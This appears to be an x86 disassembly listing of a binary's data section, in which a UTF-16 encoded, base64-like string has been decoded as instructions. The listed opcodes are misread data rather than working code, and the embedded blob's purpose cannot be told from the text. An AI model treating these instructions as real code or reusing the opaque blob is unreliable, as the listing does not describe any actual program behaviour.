  40aef2:	51                   	push   %ecx
  40aef3:	00 48 00             	add    %cl,0x0(%eax)
  40aef6:	48                   	dec    %eax
  40aef7:	00 77 00             	add    %dh,0x0(%edi)
  40aefa:	76 00                	jbe    0x40aefc
  40aefc:	73 00                	jae    0x40aefe
  40aefe:	7a 00                	jp     0x40af00
  40af00:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40af04:	6a 00                	push   $0x0
  40af06:	56                   	push   %esi
  40af07:	00 43 00             	add    %al,0x0(%ebx)
  40af0a:	69 00 58 00 7a 00    	imul   $0x7a0058,(%eax),%eax
  40af10:	75 00                	jne    0x40af12
  40af12:	66 00 31             	data16 add %dh,(%ecx)
  40af15:	00 35 00 2b 00 49    	add    %dh,0x49002b00
  40af1b:	00 6e 00             	add    %ch,0x0(%esi)
  40af1e:	34 00                	xor    $0x0,%al
  40af20:	42                   	inc    %edx
  40af21:	00 70 00             	add    %dh,0x0(%eax)
  40af24:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40af28:	58                   	pop    %eax
  40af29:	00 39                	add    %bh,(%ecx)
  40af2b:	00 30                	add    %dh,(%eax)
  40af2d:	00 50 00             	add    %dl,0x0(%eax)
  40af30:	38 00                	cmp    %al,(%eax)
  40af32:	50                   	push   %eax
  40af33:	00 30                	add    %dh,(%eax)
  40af35:	00 42 00             	add    %al,0x0(%edx)
  40af38:	64 00 31             	add    %dh,%fs:(%ecx)
  40af3b:	00 45 00             	add    %al,0x0(%ebp)
  40af3e:	32 00                	xor    (%eax),%al
  40af40:	34 00                	xor    $0x0,%al
  40af42:	78 00                	js     0x40af44
  40af44:	33 00                	xor    (%eax),%eax
  40af46:	41                   	inc    %ecx
  40af47:	00 52 00             	add    %dl,0x0(%edx)
  40af4a:	54                   	push   %esp
  40af4b:	00 46 00             	add    %al,0x0(%esi)
  40af4e:	31 00                	xor    %eax,(%eax)
  40af50:	61                   	popa
  40af51:	00 5a 00             	add    %bl,0x0(%edx)
  40af54:	43                   	inc    %ebx
  40af55:	00 35 00 30 00 46    	add    %dh,0x46003000
  40af5b:	00 57 00             	add    %dl,0x0(%edi)
  40af5e:	62 00                	bound  %eax,(%eax)
  40af60:	58                   	pop    %eax
  40af61:	00 31                	add    %dh,(%ecx)
  40af63:	00 77 00             	add    %dh,0x0(%edi)
  40af66:	7a 00                	jp     0x40af68
  40af68:	51                   	push   %ecx
  40af69:	00 68 00             	add    %ch,0x0(%eax)
  40af6c:	42                   	inc    %edx
  40af6d:	00 6b 00             	add    %ch,0x0(%ebx)
  40af70:	4d                   	dec    %ebp
  40af71:	00 51 00             	add    %dl,0x0(%ecx)
  40af74:	73 00                	jae    0x40af76
  40af76:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40af7a:	6a 00                	push   $0x0
  40af7c:	52                   	push   %edx
  40af7d:	00 7a 00             	add    %bh,0x0(%edx)
  40af80:	6d                   	insl   (%dx),%es:(%edi)
  40af81:	00 55 00             	add    %dl,0x0(%ebp)
  40af84:	5a                   	pop    %edx
  40af85:	00 6e 00             	add    %ch,0x0(%esi)
  40af88:	45                   	inc    %ebp
  40af89:	00 71 00             	add    %dh,0x0(%ecx)
  40af8c:	2b 00                	sub    (%eax),%eax
  40af8e:	74 00                	je     0x40af90
  40af90:	34 00                	xor    $0x0,%al
  40af92:	67 00 4c 00          	add    %cl,0x0(%si)
  40af96:	35 00 42 00 56       	xor    $0x56004200,%eax
  40af9b:	00 52 00             	add    %dl,0x0(%edx)
  40af9e:	65 00 33             	add    %dh,%gs:(%ebx)
  40afa1:	00 43 00             	add    %al,0x0(%ebx)
  40afa4:	39 00                	cmp    %eax,(%eax)
  40afa6:	6e                   	outsb  %ds:(%esi),(%dx)
  40afa7:	00 33                	add    %dh,(%ebx)
  40afa9:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40afad:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40afb1:	00 77 00             	add    %dh,0x0(%edi)
  40afb4:	31 00                	xor    %eax,(%eax)
  40afb6:	4a                   	dec    %edx
  40afb7:	00 76 00             	add    %dh,0x0(%esi)
  40afba:	4b                   	dec    %ebx
  40afbb:	00 70 00             	add    %dh,0x0(%eax)
  40afbe:	4a                   	dec    %edx
  40afbf:	00 30                	add    %dh,(%eax)
  40afc1:	00 61 00             	add    %ah,0x0(%ecx)
  40afc4:	70 00                	jo     0x40afc6
  40afc6:	31 00                	xor    %eax,(%eax)
  40afc8:	37                   	aaa
  40afc9:	00 63 00             	add    %ah,0x0(%ebx)
  40afcc:	39 00                	cmp    %eax,(%eax)
  40afce:	4a                   	dec    %edx
  40afcf:	00 46 00             	add    %al,0x0(%esi)
  40afd2:	2b 00                	sub    (%eax),%eax
  40afd4:	50                   	push   %eax
  40afd5:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40afd9:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40afdd:	00 33                	add    %dh,(%ebx)
  40afdf:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40afe3:	00 31                	add    %dh,(%ecx)
  40afe5:	00 43 00             	add    %al,0x0(%ebx)
  40afe8:	31 00                	xor    %eax,(%eax)
  40afea:	71 00                	jno    0x40afec
  40afec:	54                   	push   %esp
  40afed:	00 53 00             	add    %dl,0x0(%ebx)
  40aff0:	39 00                	cmp    %eax,(%eax)
  40aff2:	6a 00                	push   $0x0
  40aff4:	4a                   	dec    %edx
  40aff5:	00 4b 00             	add    %cl,0x0(%ebx)
  40aff8:	47                   	inc    %edi
  40aff9:	00 45 00             	add    %al,0x0(%ebp)
  40affc:	55                   	push   %ebp
  40affd:	00 67 00             	add    %ah,0x0(%edi)
  40b000:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40b004:	62 00                	bound  %eax,(%eax)
  40b006:	51                   	push   %ecx
  40b007:	00 35 00 4c 00 42    	add    %dh,0x42004c00
  40b00d:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40b011:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40b015:	00 52 00             	add    %dl,0x0(%edx)
  40b018:	4a                   	dec    %edx
  40b019:	00 32                	add    %dh,(%edx)
  40b01b:	00 72 00             	add    %dh,0x0(%edx)
  40b01e:	59                   	pop    %ecx
  40b01f:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40b023:	00 52 00             	add    %dl,0x0(%edx)
  40b026:	4c                   	dec    %esp
  40b027:	00 61 00             	add    %ah,0x0(%ecx)
  40b02a:	7a 00                	jp     0x40b02c
  40b02c:	66 00 4c 00 69       	data16 add %cl,0x69(%eax,%eax,1)
  40b031:	00 77 00             	add    %dh,0x0(%edi)
  40b034:	48                   	dec    %eax
  40b035:	00 4a 00             	add    %cl,0x0(%edx)
  40b038:	59                   	pop    %ecx
  40b039:	00 61 00             	add    %ah,0x0(%ecx)
  40b03c:	53                   	push   %ebx
  40b03d:	00 58 00             	add    %bl,0x0(%eax)
  40b040:	44                   	inc    %esp
  40b041:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40b045:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b048:	70 00                	jo     0x40b04a
  40b04a:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40b04e:	68 00 7a 00 71       	push   $0x71007a00
  40b053:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b056:	38 00                	cmp    %al,(%eax)
  40b058:	6e                   	outsb  %ds:(%esi),(%dx)
  40b059:	00 71 00             	add    %dh,0x0(%ecx)
  40b05c:	35 00 32 00 6c       	xor    $0x6c003200,%eax
  40b061:	00 39                	add    %bh,(%ecx)
  40b063:	00 32                	add    %dh,(%edx)
  40b065:	00 6f 00             	add    %ch,0x0(%edi)
  40b068:	2f                   	das
  40b069:	00 50 00             	add    %dl,0x0(%eax)
  40b06c:	71 00                	jno    0x40b06e
  40b06e:	5a                   	pop    %edx
  40b06f:	00 39                	add    %bh,(%ecx)
  40b071:	00 35 00 66 00 35    	add    %dh,0x35006600
  40b077:	00 38                	add    %bh,(%eax)
  40b079:	00 45 00             	add    %al,0x0(%ebp)
  40b07c:	70 00                	jo     0x40b07e
  40b07e:	54                   	push   %esp
  40b07f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b082:	73 00                	jae    0x40b084
  40b084:	55                   	push   %ebp
  40b085:	00 4b 00             	add    %cl,0x0(%ebx)
  40b088:	6c                   	insb   (%dx),%es:(%edi)
  40b089:	00 75 00             	add    %dh,0x0(%ebp)
  40b08c:	7a 00                	jp     0x40b08e
  40b08e:	4b                   	dec    %ebx
  40b08f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b092:	46                   	inc    %esi
  40b093:	00 47 00             	add    %al,0x0(%edi)
  40b096:	47                   	inc    %edi
  40b097:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40b09b:	00 4f 00             	add    %cl,0x0(%edi)
  40b09e:	65 00 30             	add    %dh,%gs:(%eax)
  40b0a1:	00 57 00             	add    %dl,0x0(%edi)
  40b0a4:	70 00                	jo     0x40b0a6
  40b0a6:	66 00 4c 00 37       	data16 add %cl,0x37(%eax,%eax,1)
  40b0ab:	00 58 00             	add    %bl,0x0(%eax)
  40b0ae:	69 00 54 00 53 00    	imul   $0x530054,(%eax),%eax
  40b0b4:	62 00                	bound  %eax,(%eax)
  40b0b6:	71 00                	jno    0x40b0b8
  40b0b8:	30 00                	xor    %al,(%eax)
  40b0ba:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b0be:	44                   	inc    %esp
  40b0bf:	00 45 00             	add    %al,0x0(%ebp)
  40b0c2:	77 00                	ja     0x40b0c4
  40b0c4:	41                   	inc    %ecx
  40b0c5:	00 68 00             	add    %ch,0x0(%eax)
  40b0c8:	34 00                	xor    $0x0,%al
  40b0ca:	67 00 37             	add    %dh,(%bx)
  40b0cd:	00 32                	add    %dh,(%edx)
  40b0cf:	00 66 00             	add    %ah,0x0(%esi)
  40b0d2:	54                   	push   %esp
  40b0d3:	00 63 00             	add    %ah,0x0(%ebx)
  40b0d6:	4f                   	dec    %edi
  40b0d7:	00 45 00             	add    %al,0x0(%ebp)
  40b0da:	77 00                	ja     0x40b0dc
  40b0dc:	72 00                	jb     0x40b0de
  40b0de:	59                   	pop    %ecx
  40b0df:	00 57 00             	add    %dl,0x0(%edi)
  40b0e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0e3:	00 68 00             	add    %ch,0x0(%eax)
  40b0e6:	35 00 77 00 61       	xor    $0x61007700,%eax
  40b0eb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0ee:	57                   	push   %edi
  40b0ef:	00 38                	add    %bh,(%eax)
  40b0f1:	00 6f 00             	add    %ch,0x0(%edi)
  40b0f4:	52                   	push   %edx
  40b0f5:	00 38                	add    %bh,(%eax)
  40b0f7:	00 7a 00             	add    %bh,0x0(%edx)
  40b0fa:	78 00                	js     0x40b0fc
  40b0fc:	30 00                	xor    %al,(%eax)
  40b0fe:	75 00                	jne    0x40b100
  40b100:	4a                   	dec    %edx
  40b101:	00 4e 00             	add    %cl,0x0(%esi)
  40b104:	51                   	push   %ecx
  40b105:	00 30                	add    %dh,(%eax)
  40b107:	00 75 00             	add    %dh,0x0(%ebp)
  40b10a:	6c                   	insb   (%dx),%es:(%edi)
  40b10b:	00 55 00             	add    %dl,0x0(%ebp)
  40b10e:	34 00                	xor    $0x0,%al
  40b110:	76 00                	jbe    0x40b112
  40b112:	37                   	aaa
  40b113:	00 61 00             	add    %ah,0x0(%ecx)
  40b116:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40b11a:	55                   	push   %ebp
  40b11b:	00 4b 00             	add    %cl,0x0(%ebx)
  40b11e:	51                   	push   %ecx
  40b11f:	00 4a 00             	add    %cl,0x0(%edx)
  40b122:	4a                   	dec    %edx
  40b123:	00 58 00             	add    %bl,0x0(%eax)
  40b126:	4d                   	dec    %ebp
  40b127:	00 76 00             	add    %dh,0x0(%esi)
  40b12a:	31 00                	xor    %eax,(%eax)
  40b12c:	68 00 32 00 42       	push   $0x42003200
  40b131:	00 79 00             	add    %bh,0x0(%ecx)
  40b134:	6a 00                	push   $0x0
  40b136:	61                   	popa
  40b137:	00 6b 00             	add    %ch,0x0(%ebx)
  40b13a:	50                   	push   %eax
  40b13b:	00 53 00             	add    %dl,0x0(%ebx)
  40b13e:	57                   	push   %edi
  40b13f:	00 52 00             	add    %dl,0x0(%edx)
  40b142:	72 00                	jb     0x40b144
  40b144:	48                   	dec    %eax
  40b145:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b149:	00 4b 00             	add    %cl,0x0(%ebx)
  40b14c:	69 00 7a 00 51 00    	imul   $0x51007a,(%eax),%eax
  40b152:	57                   	push   %edi
  40b153:	00 33                	add    %dh,(%ebx)
  40b155:	00 75 00             	add    %dh,0x0(%ebp)
  40b158:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b15c:	37                   	aaa
  40b15d:	00 76 00             	add    %dh,0x0(%esi)
  40b160:	35 00 6e 00 6c       	xor    $0x6c006e00,%eax
  40b165:	00 52 00             	add    %dl,0x0(%edx)
  40b168:	44                   	inc    %esp
  40b169:	00 55 00             	add    %dl,0x0(%ebp)
  40b16c:	42                   	inc    %edx
  40b16d:	00 45 00             	add    %al,0x0(%ebp)
  40b170:	42                   	inc    %edx
  40b171:	00 75 00             	add    %dh,0x0(%ebp)
  40b174:	45                   	inc    %ebp
  40b175:	00 42 00             	add    %al,0x0(%edx)
  40b178:	6f                   	outsl  %ds:(%esi),(%dx)
  40b179:	00 73 00             	add    %dh,0x0(%ebx)
  40b17c:	2b 00                	sub    (%eax),%eax
  40b17e:	74 00                	je     0x40b180
  40b180:	35 00 35 00 38       	xor    $0x38003500,%eax
  40b185:	00 36                	add    %dh,(%esi)
  40b187:	00 6b 00             	add    %ch,0x0(%ebx)
  40b18a:	38 00                	cmp    %al,(%eax)
  40b18c:	4f                   	dec    %edi
  40b18d:	00 61 00             	add    %ah,0x0(%ecx)
  40b190:	30 00                	xor    %al,(%eax)
  40b192:	57                   	push   %edi
  40b193:	00 46 00             	add    %al,0x0(%esi)
  40b196:	53                   	push   %ebx
  40b197:	00 55 00             	add    %dl,0x0(%ebp)
  40b19a:	52                   	push   %edx
  40b19b:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40b19f:	00 68 00             	add    %ch,0x0(%eax)
  40b1a2:	58                   	pop    %eax
  40b1a3:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1a6:	30 00                	xor    %al,(%eax)
  40b1a8:	68 00 37 00 4f       	push   $0x4f003700
  40b1ad:	00 46 00             	add    %al,0x0(%esi)
  40b1b0:	4e                   	dec    %esi
  40b1b1:	00 63 00             	add    %ah,0x0(%ebx)
  40b1b4:	61                   	popa
  40b1b5:	00 49 00             	add    %cl,0x0(%ecx)
  40b1b8:	74 00                	je     0x40b1ba
  40b1ba:	57                   	push   %edi
  40b1bb:	00 63 00             	add    %ah,0x0(%ebx)
  40b1be:	56                   	push   %esi
  40b1bf:	00 38                	add    %bh,(%eax)
  40b1c1:	00 4e 00             	add    %cl,0x0(%esi)
  40b1c4:	46                   	inc    %esi
  40b1c5:	00 69 00             	add    %ch,0x0(%ecx)
  40b1c8:	35 00 45 00 43       	xor    $0x43004500,%eax
  40b1cd:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40b1d1:	00 56 00             	add    %dl,0x0(%esi)
  40b1d4:	48                   	dec    %eax
  40b1d5:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1d8:	79 00                	jns    0x40b1da
  40b1da:	6b 00 30             	imul   $0x30,(%eax),%eax
  40b1dd:	00 30                	add    %dh,(%eax)
  40b1df:	00 67 00             	add    %ah,0x0(%edi)
  40b1e2:	61                   	popa
  40b1e3:	00 71 00             	add    %dh,0x0(%ecx)
  40b1e6:	58                   	pop    %eax
  40b1e7:	00 67 00             	add    %ah,0x0(%edi)
  40b1ea:	52                   	push   %edx
  40b1eb:	00 35 00 56 00 30    	add    %dh,0x30005600
  40b1f1:	00 2f                	add    %ch,(%edi)
  40b1f3:	00 53 00             	add    %dl,0x0(%ebx)
  40b1f6:	34 00                	xor    $0x0,%al
  40b1f8:	4a                   	dec    %edx
  40b1f9:	00 63 00             	add    %ah,0x0(%ebx)
  40b1fc:	70 00                	jo     0x40b1fe
  40b1fe:	37                   	aaa
  40b1ff:	00 41 00             	add    %al,0x0(%ecx)
  40b202:	48                   	dec    %eax
  40b203:	00 51 00             	add    %dl,0x0(%ecx)
  40b206:	4d                   	dec    %ebp
  40b207:	00 50 00             	add    %dl,0x0(%eax)
  40b20a:	44                   	inc    %esp
  40b20b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b20e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b20f:	00 4e 00             	add    %cl,0x0(%esi)
  40b212:	57                   	push   %edi
  40b213:	00 48 00             	add    %cl,0x0(%eax)
  40b216:	59                   	pop    %ecx
  40b217:	00 69 00             	add    %ch,0x0(%ecx)
  40b21a:	72 00                	jb     0x40b21c
  40b21c:	39 00                	cmp    %eax,(%eax)
  40b21e:	31 00                	xor    %eax,(%eax)
  40b220:	7a 00                	jp     0x40b222
  40b222:	71 00                	jno    0x40b224
  40b224:	47                   	inc    %edi
  40b225:	00 57 00             	add    %dl,0x0(%edi)
  40b228:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b22c:	53                   	push   %ebx
  40b22d:	00 7a 00             	add    %bh,0x0(%edx)
  40b230:	50                   	push   %eax
  40b231:	00 59 00             	add    %bl,0x0(%ecx)
  40b234:	44                   	inc    %esp
  40b235:	00 68 00             	add    %ch,0x0(%eax)
  40b238:	63 00                	arpl   %eax,(%eax)
  40b23a:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40b23e:	76 00                	jbe    0x40b240
  40b240:	2f                   	das
  40b241:	00 6e 00             	add    %ch,0x0(%esi)
  40b244:	69 00 66 00 37 00    	imul   $0x370066,(%eax),%eax
  40b24a:	72 00                	jb     0x40b24c
  40b24c:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40b250:	62 00                	bound  %eax,(%eax)
  40b252:	63 00                	arpl   %eax,(%eax)
  40b254:	58                   	pop    %eax
  40b255:	00 75 00             	add    %dh,0x0(%ebp)
  40b258:	6e                   	outsb  %ds:(%esi),(%dx)
  40b259:	00 39                	add    %bh,(%ecx)
  40b25b:	00 4e 00             	add    %cl,0x0(%esi)
  40b25e:	4a                   	dec    %edx
  40b25f:	00 61 00             	add    %ah,0x0(%ecx)
  40b262:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40b266:	66 00 35 00 39 00 30 	data16 add %dh,0x30003900
  40b26d:	00 67 00             	add    %ah,0x0(%edi)
  40b270:	63 00                	arpl   %eax,(%eax)
  40b272:	62 00                	bound  %eax,(%eax)
  40b274:	72 00                	jb     0x40b276
  40b276:	39 00                	cmp    %eax,(%eax)
  40b278:	70 00                	jo     0x40b27a
  40b27a:	76 00                	jbe    0x40b27c
  40b27c:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40b280:	72 00                	jb     0x40b282
  40b282:	54                   	push   %esp
  40b283:	00 39                	add    %bh,(%ecx)
  40b285:	00 30                	add    %dh,(%eax)
  40b287:	00 77 00             	add    %dh,0x0(%edi)
  40b28a:	4e                   	dec    %esi
  40b28b:	00 52 00             	add    %dl,0x0(%edx)
  40b28e:	6b 00 45             	imul   $0x45,(%eax),%eax
  40b291:	00 65 00             	add    %ah,0x0(%ebp)
  40b294:	4e                   	dec    %esi
  40b295:	00 2b                	add    %ch,(%ebx)
  40b297:	00 58 00             	add    %bl,0x0(%eax)
  40b29a:	31 00                	xor    %eax,(%eax)
  40b29c:	2f                   	das
  40b29d:	00 41 00             	add    %al,0x0(%ecx)
  40b2a0:	52                   	push   %edx
  40b2a1:	00 56 00             	add    %dl,0x0(%esi)
  40b2a4:	78 00                	js     0x40b2a6
  40b2a6:	66 00 6c 00 65       	data16 add %ch,0x65(%eax,%eax,1)
  40b2ab:	00 58 00             	add    %bl,0x0(%eax)
  40b2ae:	34 00                	xor    $0x0,%al
  40b2b0:	56                   	push   %esi
  40b2b1:	00 79 00             	add    %bh,0x0(%ecx)
  40b2b4:	41                   	inc    %ecx
  40b2b5:	00 4e 00             	add    %cl,0x0(%esi)
  40b2b8:	75 00                	jne    0x40b2ba
  40b2ba:	35 00 56 00 50       	xor    $0x50005600,%eax
  40b2bf:	00 38                	add    %bh,(%eax)
  40b2c1:	00 32                	add    %dh,(%edx)
  40b2c3:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b2c7:	00 32                	add    %dh,(%edx)
  40b2c9:	00 32                	add    %dh,(%edx)
  40b2cb:	00 47 00             	add    %al,0x0(%edi)
  40b2ce:	76 00                	jbe    0x40b2d0
  40b2d0:	4c                   	dec    %esp
  40b2d1:	00 4a 00             	add    %cl,0x0(%edx)
  40b2d4:	59                   	pop    %ecx
  40b2d5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2d8:	47                   	inc    %edi
  40b2d9:	00 4f 00             	add    %cl,0x0(%edi)
  40b2dc:	44                   	inc    %esp
  40b2dd:	00 49 00             	add    %cl,0x0(%ecx)
  40b2e0:	48                   	dec    %eax
  40b2e1:	00 73 00             	add    %dh,0x0(%ebx)
  40b2e4:	38 00                	cmp    %al,(%eax)
  40b2e6:	34 00                	xor    $0x0,%al
  40b2e8:	65 00 33             	add    %dh,%gs:(%ebx)
  40b2eb:	00 2b                	add    %ch,(%ebx)
  40b2ed:	00 49 00             	add    %cl,0x0(%ecx)
  40b2f0:	52                   	push   %edx
  40b2f1:	00 48 00             	add    %cl,0x0(%eax)
  40b2f4:	6d                   	insl   (%dx),%es:(%edi)
  40b2f5:	00 50 00             	add    %dl,0x0(%eax)
  40b2f8:	78 00                	js     0x40b2fa
  40b2fa:	71 00                	jno    0x40b2fc
  40b2fc:	76 00                	jbe    0x40b2fe
  40b2fe:	62 00                	bound  %eax,(%eax)
  40b300:	44                   	inc    %esp
  40b301:	00 76 00             	add    %dh,0x0(%esi)
  40b304:	71 00                	jno    0x40b306
  40b306:	48                   	dec    %eax
  40b307:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40b30b:	00 5a 00             	add    %bl,0x0(%edx)
  40b30e:	32 00                	xor    (%eax),%al
  40b310:	55                   	push   %ebp
  40b311:	00 69 00             	add    %ch,0x0(%ecx)
  40b314:	69 00 37 00 79 00    	imul   $0x790037,(%eax),%eax
  40b31a:	41                   	inc    %ecx
  40b31b:	00 30                	add    %dh,(%eax)
  40b31d:	00 32                	add    %dh,(%edx)
  40b31f:	00 78 00             	add    %bh,0x0(%eax)
  40b322:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40b326:	6d                   	insl   (%dx),%es:(%edi)
  40b327:	00 66 00             	add    %ah,0x0(%esi)
  40b32a:	31 00                	xor    %eax,(%eax)
  40b32c:	74 00                	je     0x40b32e
  40b32e:	72 00                	jb     0x40b330
  40b330:	75 00                	jne    0x40b332
  40b332:	52                   	push   %edx
  40b333:	00 67 00             	add    %ah,0x0(%edi)
  40b336:	4a                   	dec    %edx
  40b337:	00 79 00             	add    %bh,0x0(%ecx)
  40b33a:	79 00                	jns    0x40b33c
  40b33c:	71 00                	jno    0x40b33e
  40b33e:	4c                   	dec    %esp
  40b33f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b342:	59                   	pop    %ecx
  40b343:	00 6e 00             	add    %ch,0x0(%esi)
  40b346:	61                   	popa
  40b347:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40b34b:	00 6a 00             	add    %ch,0x0(%edx)
  40b34e:	57                   	push   %edi
  40b34f:	00 30                	add    %dh,(%eax)
  40b351:	00 45 00             	add    %al,0x0(%ebp)
  40b354:	4c                   	dec    %esp
  40b355:	00 67 00             	add    %ah,0x0(%edi)
  40b358:	70 00                	jo     0x40b35a
  40b35a:	74 00                	je     0x40b35c
  40b35c:	4d                   	dec    %ebp
  40b35d:	00 70 00             	add    %dh,0x0(%eax)
  40b360:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b364:	48                   	dec    %eax
  40b365:	00 51 00             	add    %dl,0x0(%ecx)
  40b368:	6a 00                	push   $0x0
  40b36a:	35 00 45 00 4a       	xor    $0x4a004500,%eax
  40b36f:	00 38                	add    %bh,(%eax)
  40b371:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b374:	7a 00                	jp     0x40b376
  40b376:	7a 00                	jp     0x40b378
  40b378:	41                   	inc    %ecx
  40b379:	00 49 00             	add    %cl,0x0(%ecx)
  40b37c:	50                   	push   %eax
  40b37d:	00 77 00             	add    %dh,0x0(%edi)
  40b380:	36 00 39             	add    %bh,%ss:(%ecx)
  40b383:	00 6d 00             	add    %ch,0x0(%ebp)
  40b386:	57                   	push   %edi
  40b387:	00 38                	add    %bh,(%eax)
  40b389:	00 65 00             	add    %ah,0x0(%ebp)
  40b38c:	32 00                	xor    (%eax),%al
  40b38e:	67 00 75 00          	add    %dh,0x0(%di)
  40b392:	4d                   	dec    %ebp
  40b393:	00 43 00             	add    %al,0x0(%ebx)
  40b396:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40b39a:	38 00                	cmp    %al,(%eax)
  40b39c:	57                   	push   %edi
  40b39d:	00 53 00             	add    %dl,0x0(%ebx)
  40b3a0:	68 00 59 00 50       	push   $0x50005900
  40b3a5:	00 47 00             	add    %al,0x0(%edi)
  40b3a8:	79 00                	jns    0x40b3aa
  40b3aa:	70 00                	jo     0x40b3ac
  40b3ac:	58                   	pop    %eax
  40b3ad:	00 48 00             	add    %cl,0x0(%eax)
  40b3b0:	46                   	inc    %esi
  40b3b1:	00 7a 00             	add    %bh,0x0(%edx)
  40b3b4:	69 00 75 00 38 00    	imul   $0x380075,(%eax),%eax
  40b3ba:	52                   	push   %edx
  40b3bb:	00 70 00             	add    %dh,0x0(%eax)
  40b3be:	70 00                	jo     0x40b3c0
  40b3c0:	48                   	dec    %eax
  40b3c1:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b3c5:	00 6a 00             	add    %ch,0x0(%edx)
  40b3c8:	54                   	push   %esp
  40b3c9:	00 58 00             	add    %bl,0x0(%eax)
  40b3cc:	2b 00                	sub    (%eax),%eax
  40b3ce:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b3d2:	62 00                	bound  %eax,(%eax)
  40b3d4:	71 00                	jno    0x40b3d6
  40b3d6:	38 00                	cmp    %al,(%eax)
  40b3d8:	48                   	dec    %eax
  40b3d9:	00 6f 00             	add    %ch,0x0(%edi)
  40b3dc:	49                   	dec    %ecx
  40b3dd:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40b3e1:	00 5a 00             	add    %bl,0x0(%edx)
  40b3e4:	4d                   	dec    %ebp
  40b3e5:	00 41 00             	add    %al,0x0(%ecx)
  40b3e8:	48                   	dec    %eax
  40b3e9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3ec:	54                   	push   %esp
  40b3ed:	00 51 00             	add    %dl,0x0(%ecx)
  40b3f0:	68 00 53 00 54       	push   $0x54005300
  40b3f5:	00 33                	add    %dh,(%ebx)
  40b3f7:	00 79 00             	add    %bh,0x0(%ecx)
  40b3fa:	30 00                	xor    %al,(%eax)
  40b3fc:	44                   	inc    %esp
  40b3fd:	00 6e 00             	add    %ch,0x0(%esi)
  40b400:	51                   	push   %ecx
  40b401:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40b405:	00 53 00             	add    %dl,0x0(%ebx)
  40b408:	7a 00                	jp     0x40b40a
  40b40a:	4a                   	dec    %edx
  40b40b:	00 45 00             	add    %al,0x0(%ebp)
  40b40e:	44                   	inc    %esp
  40b40f:	00 50 00             	add    %dl,0x0(%eax)
  40b412:	65 00 2f             	add    %ch,%gs:(%edi)
  40b415:	00 5a 00             	add    %bl,0x0(%edx)
  40b418:	63 00                	arpl   %eax,(%eax)
  40b41a:	43                   	inc    %ebx
  40b41b:	00 78 00             	add    %bh,0x0(%eax)
  40b41e:	6a 00                	push   $0x0
  40b420:	4c                   	dec    %esp
  40b421:	00 6e 00             	add    %ch,0x0(%esi)
  40b424:	4b                   	dec    %ebx
  40b425:	00 6e 00             	add    %ch,0x0(%esi)
  40b428:	38 00                	cmp    %al,(%eax)
  40b42a:	48                   	dec    %eax
  40b42b:	00 75 00             	add    %dh,0x0(%ebp)
  40b42e:	74 00                	je     0x40b430
  40b430:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40b434:	53                   	push   %ebx
  40b435:	00 69 00             	add    %ch,0x0(%ecx)
  40b438:	54                   	push   %esp
  40b439:	00 4d 00             	add    %cl,0x0(%ebp)
  40b43c:	77 00                	ja     0x40b43e
  40b43e:	44                   	inc    %esp
  40b43f:	00 6e 00             	add    %ch,0x0(%esi)
  40b442:	72 00                	jb     0x40b444
  40b444:	45                   	inc    %ebp
  40b445:	00 63 00             	add    %ah,0x0(%ebx)
  40b448:	4d                   	dec    %ebp
  40b449:	00 47 00             	add    %al,0x0(%edi)
  40b44c:	53                   	push   %ebx
  40b44d:	00 6f 00             	add    %ch,0x0(%edi)
  40b450:	41                   	inc    %ecx
  40b451:	00 4d 00             	add    %cl,0x0(%ebp)
  40b454:	4d                   	dec    %ebp
  40b455:	00 38                	add    %bh,(%eax)
  40b457:	00 50 00             	add    %dl,0x0(%eax)
  40b45a:	4e                   	dec    %esi
  40b45b:	00 58 00             	add    %bl,0x0(%eax)
  40b45e:	47                   	inc    %edi
